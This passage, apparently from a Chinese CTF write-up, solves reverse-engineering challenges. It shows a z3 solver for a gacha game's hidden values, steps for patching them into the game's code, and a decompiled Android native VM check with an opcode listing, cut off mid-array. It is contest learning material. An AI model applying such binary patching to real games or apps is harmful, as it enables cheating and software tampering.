-<span class="number">24</span> + bucket[<span class="number">8</span>] * -<span class="number">82</span> + bucket[<span class="number">9</span>] * -<span class="number">58</span> + bucket[<span class="number">10</span>] * -<span class="number">36</span> + bucket[<span class="number">11</span>] * <span class="number">64</span> + bucket[<span class="number">12</span>] * -<span class="number">49</span> + bucket[<span class="number">13</span>] * -<span class="number">22</span> + bucket[<span class="number">14</span>] * <span class="number">59</span> + bucket[<span class="number">15</span>] * -<span class="number">47</span> == -<span class="number">674</span> , bucket[<span class="number">0</span>] * <span class="number">67</span> + bucket[<span class="number">1</span>] * -<span class="number">23</span> + bucket[<span class="number">2</span>] * <span class="number">63</span> + bucket[<span class="number">3</span>] * -<span class="number">38</span> + bucket[<span class="number">4</span>] * -<span class="number">32</span> + bucket[<span class="number">5</span>] * <span class="number">61</span> + bucket[<span class="number">6</span>] * -<span class="number">71</span> + bucket[<span class="number">7</span>] * <span class="number">49</span> + bucket[<span class="number">8</span>] * <span class="number">83</span> + bucket[<span class="number">9</span>] * -<span class="number">92</span> + bucket[<span class="number">10</span>] * -<span class="number">16</span> + bucket[<span class="number">11</span>] * <span class="number">65</span> + bucket[<span class="number">12</span>] * -<span class="number">22</span> + bucket[<span class="number">13</span>] * <span class="number">12</span> + bucket[<span class="number">14</span>] * -<span class="number">85</span> + bucket[<span class="number">15</span>] * <span class="number">74</span> == <span class="number">945</span> , bucket[<span class="number">0</span>] * -<span class="number">49</span> + bucket[<span class="number">1</span>] * <span class="number">48</span> + bucket[<span class="number">2</span>] * -<span class="number">11</span> + bucket[<span class="number">3</span>] * <span class="number">20</span> + bucket[<span class="number">4</span>] * -<span class="number">14</span> + bucket[<span class="number">5</span>] * <span class="number">92</span> + bucket[<span class="number">6</span>] * -<span class="number">19</span> + bucket[<span class="number">7</span>] * <span class="number">32</span> + bucket[<span class="number">8</span>] * <span class="number">64</span> + bucket[<span class="number">9</span>] * -<span class="number">77</span> + bucket[<span class="number">10</span>] * <span class="number">49</span> + bucket[<span class="number">11</span>] * -<span class="number">19</span> + bucket[<span class="number">12</span>] * <span class="number">72</span> + bucket[<span class="number">13</span>] * -<span class="number">64</span> + bucket[<span class="number">14</span>] * <span class="number">85</span> + bucket[<span class="number">15</span>] * <span class="number">54</span> == <span class="number">1721</span> , bucket[<span class="number">0</span>] * <span class="number">36</span> + bucket[<span class="number">1</span>] * -<span class="number">21</span> + bucket[<span class="number">2</span>] * -<span class="number">59</span> + bucket[<span class="number">3</span>] * -<span class="number">54</span> + bucket[<span class="number">4</span>] * -<span class="number">96</span> + bucket[<span class="number">5</span>] * -<span class="number">81</span> + bucket[<span class="number">6</span>] * -<span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">31</span> + bucket[<span class="number">8</span>] * -<span class="number">41</span> + bucket[<span class="number">9</span>] * -<span class="number">70</span> + bucket[<span class="number">10</span>] * -<span class="number">27</span> + bucket[<span class="number">11</span>] * <span class="number">24</span> + bucket[<span class="number">12</span>] * <span class="number">95</span> + bucket[<span class="number">13</span>] * -<span class="number">61</span> + bucket[<span class="number">14</span>] * -<span class="number">17</span> + bucket[<span class="number">15</span>] * -<span class="number">52</span> == -<span class="number">2198</span> , bucket[<span class="number">0</span>] * <span class="number">78</span> + bucket[<span class="number">1</span>] * -<span class="number">62</span> + bucket[<span class="number">2</span>] * <span class="number">70</span> + bucket[<span class="number">3</span>] * -<span class="number">69</span> + bucket[<span class="number">4</span>] * <span class="number">38</span> + bucket[<span class="number">5</span>] * <span class="number">90</span> + bucket[<span class="number">6</span>] * -<span class="number">52</span> + bucket[<span class="number">7</span>] * <span class="number">41</span> + bucket[<span class="number">8</span>] * <span class="number">63</span> + bucket[<span class="number">9</span>] * -<span class="number">65</span> + bucket[<span class="number">10</span>] * -<span class="number">15</span> + bucket[<span class="number">11</span>] * <span class="number">59</span> + bucket[<span class="number">12</span>] * -<span class="number">31</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * <span class="number">33</span> + bucket[<span class="number">15</span>] * -<span class="number">57</span> == -<span class="number">1833</span> , bucket[<span class="number">0</span>] * <span class="number">56</span> + bucket[<span class="number">1</span>] * <span class="number">75</span> + bucket[<span class="number">2</span>] * <span class="number">71</span> + bucket[<span class="number">3</span>] * <span class="number">78</span> + bucket[<span class="number">4</span>] * -<span class="number">39</span> + bucket[<span class="number">5</span>] * -<span class="number">84</span> + bucket[<span class="number">6</span>] * <span class="number">55</span> + bucket[<span class="number">7</span>] * <span class="number">54</span> + bucket[<span class="number">8</span>] * -<span class="number">12</span> + bucket[<span class="number">9</span>] * -<span class="number">57</span> + bucket[<span class="number">10</span>] * <span class="number">32</span> + bucket[<span class="number">11</span>] * -<span class="number">19</span> + bucket[<span class="number">12</span>] * <span class="number">13</span> + bucket[<span class="number">13</span>] * -<span class="number">83</span> + bucket[<span class="number">14</span>] * <span class="number">11</span> + bucket[<span class="number">15</span>] * -<span class="number">67</span> == <span class="number">829</span> , bucket[<span class="number">0</span>] * <span class="number">10</span> + bucket[<span class="number">1</span>] * -<span class="number">97</span> + bucket[<span class="number">2</span>] * <span class="number">56</span> + bucket[<span class="number">3</span>] * -<span class="number">61</span> + bucket[<span class="number">4</span>] * <span class="number">45</span> + bucket[<span class="number">5</span>] * -<span class="number">22</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">81</span> + bucket[<span class="number">8</span>] * <span class="number">32</span> + bucket[<span class="number">9</span>] * <span class="number">49</span> + bucket[<span class="number">10</span>] * -<span class="number">19</span> + bucket[<span class="number">11</span>] * -<span class="number">18</span> + bucket[<span class="number">12</span>] * <span class="number">80</span> + bucket[<span class="number">13</span>] * -<span class="number">98</span> + bucket[<span class="number">14</span>] * <span class="number">79</span> + bucket[<span class="number">15</span>] * -<span class="number">36</span> == -<span class="number">2551</span> , bucket[<span class="number">0</span>] * <span class="number">24</span> + bucket[<span class="number">1</span>] * -<span class="number">61</span> + bucket[<span class="number">2</span>] * <span class="number">91</span> + bucket[<span class="number">3</span>] * <span class="number">93</span> + bucket[<span class="number">4</span>] * <span class="number">76</span> + bucket[<span class="number">5</span>] * <span class="number">54</span> + bucket[<span class="number">6</span>] * -<span class="number">33</span> + bucket[<span class="number">7</span>] * -<span class="number">29</span> + bucket[<span class="number">8</span>] * -<span class="number">72</span> + bucket[<span class="number">9</span>] * <span class="number">20</span> + bucket[<span class="number">10</span>] * <span class="number">48</span> + bucket[<span class="number">11</span>] * <span class="number">79</span> + bucket[<span class="number">12</span>] * <span class="number">76</span> + bucket[<span class="number">13</span>] * <span class="number">68</span> + bucket[<span class="number">14</span>] * <span class="number">51</span> + bucket[<span class="number">15</span>] * <span class="number">25</span> == <span class="number">2996</span> , bucket[<span class="number">0</span>] * -<span class="number">83</span> + bucket[<span class="number">1</span>] * -<span class="number">77</span> + bucket[<span class="number">2</span>] * -<span class="number">64</span> + bucket[<span class="number">3</span>] * -<span class="number">38</span> + bucket[<span class="number">4</span>] * -<span class="number">13</span> + bucket[<span class="number">5</span>] * -<span class="number">85</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * -<span class="number">76</span> + bucket[<span class="number">8</span>] * <span class="number">27</span> + bucket[<span class="number">9</span>] * <span class="number">14</span> + bucket[<span class="number">10</span>] * -<span class="number">79</span> + bucket[<span class="number">11</span>] * -<span class="number">63</span> + bucket[<span class="number">12</span>] * -<span class="number">78</span> + bucket[<span class="number">13</span>] * <span class="number">53</span> + bucket[<span class="number">14</span>] * -<span class="number">73</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == -<span class="number">2315</span> , bucket[<span class="number">0</span>] * <span class="number">84</span> + bucket[<span class="number">1</span>] * -<span class="number">67</span> + bucket[<span class="number">2</span>] * <span class="number">57</span> + bucket[<span class="number">3</span>] * <span class="number">26</span> + bucket[<span class="number">4</span>] * <span class="number">94</span> + bucket[<span class="number">5</span>] * <span class="number">20</span> + bucket[<span class="number">6</span>] * -<span class="number">71</span> + bucket[<span class="number">7</span>] * -<span class="number">88</span> + bucket[<span class="number">8</span>] * -<span class="number">28</span> + bucket[<span class="number">9</span>] * -<span class="number">13</span> + bucket[<span class="number">10</span>] * -<span class="number">40</span> + bucket[<span class="number">11</span>] * <span class="number">76</span> + bucket[<span class="number">12</span>] * -<span class="number">14</span> + bucket[<span class="number">13</span>] * <span class="number">33</span> + bucket[<span class="number">14</span>] * <span class="number">76</span> + bucket[<span class="number">15</span>] * -<span class="number">75</span> == -<span class="number">150</span> , bucket[<span class="number">0</span>] * -<span class="number">60</span> + bucket[<span class="number">1</span>] * <span class="number">88</span> + bucket[<span class="number">2</span>] * -<span class="number">66</span> + bucket[<span class="number">3</span>] * -<span class="number">72</span> + bucket[<span class="number">4</span>] * <span class="number">41</span> + bucket[<span class="number">5</span>] * <span class="number">49</span> + bucket[<span class="number">6</span>] * <span class="number">48</span> + bucket[<span class="number">7</span>] * -<span class="number">77</span> + bucket[<span class="number">8</span>] * -<span class="number">42</span> + bucket[<span class="number">9</span>] * <span class="number">25</span> + bucket[<span class="number">10</span>] * -<span class="number">50</span> + bucket[<span class="number">11</span>] * -<span class="number">84</span> + bucket[<span class="number">12</span>] * <span class="number">40</span> + bucket[<span class="number">13</span>] * <span class="number">50</span> + bucket[<span class="number">14</span>] * -<span class="number">83</span> + bucket[<span class="number">15</span>] * -<span class="number">27</span> == -<span class="number">1919</span> , bucket[<span class="number">0</span>] * -<span class="number">16</span> + bucket[<span class="number">1</span>] * -<span class="number">53</span> + bucket[<span class="number">2</span>] * -<span class="number">21</span> + bucket[<span class="number">3</span>] * -<span class="number">44</span> + bucket[<span class="number">4</span>] * <span class="number">26</span> + bucket[<span class="number">5</span>] * -<span class="number">56</span> + bucket[<span class="number">6</span>] * -<span class="number">90</span> + bucket[<span class="number">7</span>] * -<span class="number">93</span> + bucket[<span class="number">8</span>] * -<span class="number">73</span> + bucket[<span class="number">9</span>] * <span class="number">48</span> + bucket[<span class="number">10</span>] * <span class="number">15</span> + bucket[<span class="number">11</span>] * -<span class="number">43</span> + bucket[<span class="number">12</span>] * -<span class="number">61</span> + bucket[<span class="number">13</span>] * -<span class="number">24</span> + bucket[<span class="number">14</span>] * <span class="number">71</span> + bucket[<span class="number">15</span>] * <span class="number">67</span> == -<span class="number">1199</span> , bucket[<span class="number">0</span>] * <span class="number">55</span> + bucket[<span class="number">1</span>] * -<span class="number">34</span> + bucket[<span class="number">2</span>] * -<span class="number">22</span> + bucket[<span class="number">3</span>] * <span class="number">60</span> + bucket[<span class="number">4</span>] * <span class="number">93</span> + bucket[<span class="number">5</span>] * -<span class="number">95</span> + bucket[<span class="number">6</span>] * <span class="number">50</span> + bucket[<span class="number">7</span>] * <span class="number">36</span> + bucket[<span class="number">8</span>] * -<span class="number">48</span> + bucket[<span class="number">9</span>] * -<span class="number">26</span> + bucket[<span class="number">10</span>] * -<span class="number">94</span> + bucket[<span class="number">11</span>] * -<span class="number">35</span> + bucket[<span class="number">12</span>] * <span class="number">21</span> + bucket[<span class="number">13</span>] * -<span class="number">27</span> + bucket[<span class="number">14</span>] * <span class="number">91</span> + bucket[<span class="number">15</span>] * -<span class="number">76</span> == -<span class="number">1163</span> , bucket[<span class="number">0</span>] * <span class="number">64</span> + bucket[<span class="number">1</span>] * -<span class="number">50</span> + bucket[<span class="number">2</span>] * -<span class="number">23</span> + bucket[<span class="number">3</span>] * -<span class="number">70</span> + bucket[<span class="number">4</span>] * -<span class="number">78</span> + bucket[<span class="number">5</span>] * <span class="number">34</span> + bucket[<span class="number">6</span>] * <span class="number">26</span> + bucket[<span class="number">7</span>] * <span class="number">64</span> + bucket[<span class="number">8</span>] * -<span class="number">72</span> + bucket[<span class="number">9</span>] * <span class="number">10</span> + bucket[<span class="number">10</span>] * -<span class="number">96</span> + bucket[<span class="number">11</span>] * <span class="number">61</span> + bucket[<span class="number">12</span>] * -<span class="number">15</span> + bucket[<span class="number">13</span>] * <span class="number">31</span> + bucket[<span class="number">14</span>] * <span class="number">36</span> + bucket[<span class="number">15</span>] * <span class="number">50</span> == -<span class="number">266</span> , bucket[<span class="number">0</span>] * -<span class="number">27</span> + bucket[<span class="number">1</span>] * <span class="number">86</span> + bucket[<span class="number">2</span>] * -<span class="number">61</span> + bucket[<span class="number">3</span>] * <span class="number">89</span> + bucket[<span class="number">4</span>] * -<span class="number">53</span> + bucket[<span class="number">5</span>] * <span class="number">10</span> + bucket[<span class="number">6</span>] * -<span class="number">42</span> + bucket[<span class="number">7</span>] * <span class="number">92</span> + bucket[<span class="number">8</span>] * -<span class="number">48</span> + bucket[<span class="number">9</span>] * <span class="number">13</span> + bucket[<span class="number">10</span>] * <span class="number">84</span> + bucket[<span class="number">11</span>] * -<span class="number">71</span> + bucket[<span class="number">12</span>] * <span class="number">93</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * -<span class="number">69</span> + bucket[<span class="number">15</span>] * -<span class="number">30</span> == <span class="number">892</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this.bucket[%d] = %s;&#x27;</span> % (i, m[bucket[i]]))</span><br><span class="line">       <span class="comment"># print(&#x27;%s,&#x27;% m[bucket[i]],end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#this.bucket[0] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[1] = 14;</span></span><br><span class="line"><span class="comment">#this.bucket[2] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[3] = 17;</span></span><br><span class="line"><span class="comment">#this.bucket[4] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[5] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[6] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[7] = 0;</span></span><br><span class="line"><span class="comment">#this.bucket[8] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[9] = 4;</span></span><br><span class="line"><span class="comment">#this.bucket[10] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[11] = 17;</span></span><br><span class="line"><span class="comment">#this.bucket[12] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[13] = 0;</span></span><br><span class="line"><span class="comment">#this.bucket[14] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[15] = 16;</span></span><br></pre></td></tr></table></figure><p>那么在int[] bucket = GachaManager.instance.gachaHistoryBucket.GetBucket();中直接写入bucket的值，右键-&gt;编辑方法-&gt;写入上面的内容-&gt;编译-&gt;上面工具栏保存所有-&gt;打开主程序-&gt;出金</p><p><img src="https://s2.loli.net/2024/02/16/q9Az37dHfU52bsl.png" alt="image-20240216121732007"></p><h3 id="EzADVM">EzADVM</h3><p>这个是个安卓vm，jadx打开，然后打开main_activity,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CheckClick</span><span class="params">(View a)</span> &#123;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.sampleText;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">flagText</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.flagtext;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flagstring</span> <span class="operator">=</span> flagText.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Right!&quot;</span>.equals(stringFromJNI(flagstring))) &#123;</span><br><span class="line">            tv.setText(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">            tv.setTextColor(-<span class="number">16711936</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>看到有stringFromJNI(flagstring)，去找函数原型，没找到，应该在库里。</p><p>用apktool反编译出源代码。打开so文件</p><p>重点是这些：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">now_num = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">1</span>;</span><br><span class="line">  used_char = _JNIEnv::GetStringUTFChars(in, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !i++ )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;(v14, <span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        v7 = (<span class="type">const</span> <span class="type">char</span> *)sub_20F50(v14);</span><br><span class="line">        v13 = _JNIEnv::NewStringUTF(in, v7);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v14);</span><br><span class="line">        <span class="keyword">return</span> v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( code[i] != <span class="number">0x21</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __strcpy_chk(input, used_char, <span class="number">1024LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0x88</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( code[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA1</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = or_not_num &amp; or_num;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC3</span>u:</span><br><span class="line">        or_num = b1 | b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB2</span>u:</span><br><span class="line">        not_1 = ~b1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xE5</span>u:</span><br><span class="line">        not_2 = ~b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF1</span>u:</span><br><span class="line">        b1 = input[now_num];</span><br><span class="line">        b2 = input[++now_num];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xD4</span>u:</span><br><span class="line">        or_not_num = not_2 | not_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBF</span>u:</span><br><span class="line">        i_form = now_num++;</span><br><span class="line">        save[<span class="number">0</span>] = s[i_form];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x99</span>u:</span><br><span class="line">        now_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBB</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = now_num + save[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;last, s, <span class="number">0x20</span>uLL) )</span><br></pre></td></tr></table></figure><p>输入用来初始化input了，所以相当于是用指令码对input加密，最后得到last</p><p>以及一开始有一个循环只有当code[i]==0先1时才会执行初始化，所以只需要匹配合理的指令即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span 